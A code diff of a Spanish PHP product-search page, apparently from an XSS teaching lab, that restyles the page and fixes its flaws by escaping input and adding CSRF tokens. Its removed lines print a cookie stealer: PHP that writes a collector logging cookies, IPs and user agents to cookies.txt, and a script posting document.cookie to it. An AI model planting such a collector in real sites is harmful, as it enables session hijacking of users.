@@ -1,3 +1,48 @@
+<?php
+session_start();
+require "db.php";
+
+// Generar token CSRF si no existe
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// Inicializar variables
+$search_get = isset($_GET['search_get']) ? $_GET['search_get'] : '';
+$search_post = isset($_POST['search_post']) ? $_POST['search_post'] : '';
+$productos = [];
+
+try {
+    // Consulta base para productos
+    $base_query = "SELECT * FROM products";
+
+    // Procesar búsqueda GET
+    if (!empty($search_get)) {
+        $query = $base_query . " WHERE nombreProducto LIKE :search OR descripcionProducto LIKE :search";
+        $stmt = $conn->prepare($query);
+        $search_term = "%" . $search_get . "%";
+        $stmt->bindParam(':search', $search_term);
+        $stmt->execute();
+        $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    }
+    // Procesar búsqueda POST
+    elseif (!empty($search_post)) {
+        $query = $base_query . " WHERE nombreProducto LIKE :search OR descripcionProducto LIKE :search";
+        $stmt = $conn->prepare($query);
+        $search_term = "%" . $search_post . "%";
+        $stmt->bindParam(':search', $search_term);
+        $stmt->execute();
+        $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    }
+    // Sin búsqueda, mostrar todos los productos
+    else {
+        $stmt = $conn->query($base_query);
+        $productos = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    }
+} catch (PDOException $e) {
+    die("Error de base de datos: " . $e->getMessage());
+}
+?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -9,8 +54,8 @@
         /* Estilos generales */
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #e0e0e0;
+            background: linear-gradient(135deg, #B5EAD7 0%, #C7CEEA 100%);
+            color: #4A4A4A;
             margin: 0;
             padding: 0;
             line-height: 1.6;
@@ -25,13 +70,23 @@
 
         h1 {
             text-align: center;
-            color: #4CAF50;
+            color: #4A4A4A;
             font-size: 2.8rem;
             margin-bottom: 2rem;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 2px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            animation: softGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes softGlow {
+            from {
+                text-shadow: 0 0 10px #fff, 0 0 20px #B5EAD7;
+            }
+            to {
+                text-shadow: 0 0 20px #fff, 0 0 30px #C7CEEA;
+            }
         }
 
         /* Barra de navegación */
@@ -45,91 +100,100 @@
 
         .nav-buttons a {
             padding: 0.8rem 1.5rem;
-            background-color: #4CAF50;
-            color: white;
+            background: rgba(255, 255, 255, 0.4);
+            color: #4A4A4A;
             text-decoration: none;
             border-radius: 25px;
             font-weight: 500;
             transition: all 0.3s ease;
-            border: none;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(10px);
         }
 
         .nav-buttons a:hover {
-            background-color: #45a049;
+            background: rgba(255, 255, 255, 0.6);
             transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
         }
 
         /* Formularios de búsqueda */
         .search-form {
-            background: rgba(22, 33, 62, 0.8);
+            background: rgba(255, 255, 255, 0.3);
             padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.05);
             margin-bottom: 2rem;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.4);
         }
 
         .search-form h2 {
             margin-top: 0;
-            color: #4CAF50;
+            color: #4A4A4A;
             font-size: 1.8rem;
             font-weight: 500;
             margin-bottom: 1.5rem;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
 
         .search-form input[type="text"] {
             width: calc(100% - 140px);
             padding: 1rem;
-            border: 2px solid rgba(76, 175, 80, 0.3);
+            border: 1px solid rgba(255,255,255,0.6);
             border-radius: 25px;
             font-size: 1rem;
-            color: #e0e0e0;
-            background-color: rgba(26, 26, 46, 0.7);
+            color: #4A4A4A;
+            background: rgba(255,255,255,0.4);
             transition: all 0.3s ease;
             margin-right: 1rem;
         }
 
+        .search-form input[type="text"]::placeholder {
+            color: rgba(74,74,74,0.7);
+        }
+
         .search-form input[type="text"]:focus {
-            border-color: #4CAF50;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
+            border-color: rgba(255,255,255,0.8);
+            box-shadow: 0 0 15px rgba(255,255,255,0.3);
+            background: rgba(255,255,255,0.5);
         }
 
         .search-form button {
             padding: 1rem 1.5rem;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
+            background: rgba(255,255,255,0.4);
+            color: #4A4A4A;
+            border: 1px solid rgba(255,255,255,0.6);
             border-radius: 25px;
             font-size: 1rem;
             cursor: pointer;
             transition: all 0.3s ease;
             font-weight: 500;
+            backdrop-filter: blur(5px);
         }
 
         .search-form button:hover {
-            background-color: #45a049;
+            background: rgba(255,255,255,0.6);
             transform: translateY(-2px);
         }
 
         /* Resultados de búsqueda */
         .results {
-            background: rgba(22, 33, 62, 0.8);
+            background: rgba(255,255,255,0.3);
             padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.05);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.4);
+            margin-bottom: 2rem;
         }
 
         .results h3 {
-            color: #4CAF50;
+            color: #4A4A4A;
             font-size: 1.5rem;
             font-weight: 500;
             margin-bottom: 1.5rem;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
 
         table {
@@ -137,49 +201,59 @@
             border-collapse: separate;
             border-spacing: 0;
             margin-bottom: 1.5rem;
-            background: rgba(26, 26, 46, 0.7);
-            border-radius: 10px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 15px;
             overflow: hidden;
         }
 
         th, td {
             padding: 1rem;
             text-align: left;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            border-bottom: 1px solid rgba(255,255,255,0.2);
         }
 
         th {
-            background-color: rgba(76, 175, 80, 0.2);
-            color: #4CAF50;
+            background: rgba(255,255,255,0.3);
+            color: #4A4A4A;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         tr:hover {
-            background-color: rgba(76, 175, 80, 0.1);
+            background: rgba(255,255,255,0.3);
             transition: background-color 0.3s ease;
         }
 
-        /* Mensaje de advertencia */
-        .warning {
-            text-align: center;
-            color: white;
-            font-size: 2rem;
-            font-weight: bold;
-            background-color: #ff4444;
-            padding: 2rem;
-            animation: shake 0.5s infinite;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            border-radius: 15px;
-            margin: 2rem 0;
+        /* Botones de acción */
+        .btn {
+            padding: 0.5rem 1rem;
+            background: rgba(255,255,255,0.4);
+            color: #4A4A4A;
+            text-decoration: none;
+            border-radius: 20px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255,255,255,0.6);
+            backdrop-filter: blur(5px);
+            display: inline-block;
+            margin: 0.25rem;
         }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+        .btn:hover {
+            background: rgba(255,255,255,0.6);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .btn-danger {
+            background: rgba(255, 182, 193, 0.4);
+            border-color: rgba(255, 182, 193, 0.6);
+            color: #D84A4A;
+        }
+
+        .btn-danger:hover {
+            background: rgba(255, 182, 193, 0.6);
         }
 
         /* Responsive */
@@ -209,6 +283,11 @@
                 width: 100%;
                 text-align: center;
             }
+
+            table {
+                display: block;
+                overflow-x: auto;
+            }
         }
     </style>
 </head>
@@ -223,14 +302,15 @@
             <a href="cerrarsesion.php" class="btn btn-danger">Cerrar sesión</a>
         </div>
 
-        <!-- Formulario de búsqueda con GET (vulnerable a XSS) -->
+        <!-- Formulario de búsqueda con GET -->
         <div class="search-form">
-            <h2>Búsqueda con GET (Vulnerable a XSS)</h2>
+            <h2>Búsqueda con GET</h2>
             <form method="GET" action="">
-                <input type="text" name="search_get" placeholder="Buscar productos..." value="<?php echo $search_get; ?>">
+                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                <input type="text" name="search_get" placeholder="Buscar productos..." value="<?php echo htmlspecialchars($search_get); ?>">
                 <button type="submit">Buscar</button>
                 <?php if (!empty($search_get)): ?>
-                    <a href="?clear_search=true" class="btn btn-danger">Limpiar Búsqueda</a>
+                    <a href="?clear_search=true&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" class="btn btn-danger">Limpiar Búsqueda</a>
                 <?php endif; ?>
             </form>
         </div>
@@ -258,8 +338,12 @@
                                     <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
                                     <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
                                     <td>
-                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
-                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
+                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>">Editar</a>
+                                        <form method="POST" action="eliminar_producto.php" style="display: inline;">
+                                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                                            <input type="hidden" name="id" value="<?php echo $producto['idProducto']; ?>">
+                                            <button type="submit" class="btn btn-danger" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</button>
+                                        </form>
                                     </td>
                                 </tr>
                             <?php endforeach; ?>
@@ -273,14 +357,15 @@
             </div>
         <?php endif; ?>
 
-        <!-- Formulario de búsqueda con POST (vulnerable a XSS) -->
+        <!-- Formulario de búsqueda con POST -->
         <div class="search-form">
-            <h2>Búsqueda con POST (Vulnerable a XSS)</h2>
+            <h2>Búsqueda con POST</h2>
             <form method="POST" action="">
-                <input type="text" name="search_post" placeholder="Buscar productos..." value="<?php echo $search_post; ?>">
+                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                <input type="text" name="search_post" placeholder="Buscar productos..." value="<?php echo htmlspecialchars($search_post); ?>">
                 <button type="submit">Buscar</button>
                 <?php if (!empty($search_post)): ?>
-                    <a href="?clear_search=true" class="btn btn-danger">Limpiar Búsqueda</a>
+                    <a href="?clear_search=true&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" class="btn btn-danger">Limpiar Búsqueda</a>
                 <?php endif; ?>
             </form>
         </div>
@@ -308,8 +393,12 @@
                                     <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
                                     <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
                                     <td>
-                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
-                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
+                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>">Editar</a>
+                                        <form method="POST" action="eliminar_producto.php" style="display: inline;">
+                                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                                            <input type="hidden" name="id" value="<?php echo $producto['idProducto']; ?>">
+                                            <button type="submit" class="btn btn-danger" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</button>
+                                        </form>
                                     </td>
                                 </tr>
                             <?php endforeach; ?>
@@ -346,8 +435,12 @@
                                     <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
                                     <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
                                     <td>
-                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
-                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
+                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>">Editar</a>
+                                        <form method="POST" action="eliminar_producto.php" style="display: inline;">
+                                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+                                            <input type="hidden" name="id" value="<?php echo $producto['idProducto']; ?>">
+                                            <button type="submit" class="btn btn-danger" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</button>
+                                        </form>
                                     </td>
                                 </tr>
                             <?php endforeach; ?>
@@ -363,57 +456,5 @@
 
         <a class="btn" href="agregar_producto.php">Agregar Producto</a>
     </div>
-
-    <?php
-    // Código para guardar cookies.php
-    // Este archivo debe existir en el mismo directorio
-    $guardar_cookies_php = <<<'EOD'
-<?php
-// Recibir los datos JSON
-$json_data = file_get_contents('php://input');
-$data = json_decode($json_data, true);
-
-if (isset($data['cookie'])) {
-    // Guardar la cookie en cookies.txt
-    $cookie = $data['cookie'];
-    $fecha = date('Y-m-d H:i:s');
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    
-    $contenido = "Fecha: $fecha\nIP: $ip\nUser-Agent: $user_agent\nCookie: $cookie\n\n";
-    
-    // Guardar en el archivo
-    file_put_contents('cookies.txt', $contenido, FILE_APPEND);
-    
-    // Responder con éxito
-    header('Content-Type: application/json');
-    echo json_encode(['success' => true]);
-} else {
-    // Responder con error
-    header('Content-Type: application/json');
-    echo json_encode(['success' => false, 'error' => 'No cookie data provided']);
-}
-?>
-EOD;
-
-    // Guardar el archivo guardar_cookies.php si no existe
-    if (!file_exists('guardar_cookies.php')) {
-        file_put_contents('guardar_cookies.php', $guardar_cookies_php);
-    }
-    ?>
-
-    <!-- Script para detectar y manejar ataques XSS -->
-    <?php if ($xss_attack): ?>
-    <script>
-        // Enviar las cookies a un archivo PHP para guardarlas en cookies.txt
-        fetch('guardar_cookies.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ cookie: document.cookie }),
-        });
-    </script>
-    <?php endif; ?>
 </body>
 </html>
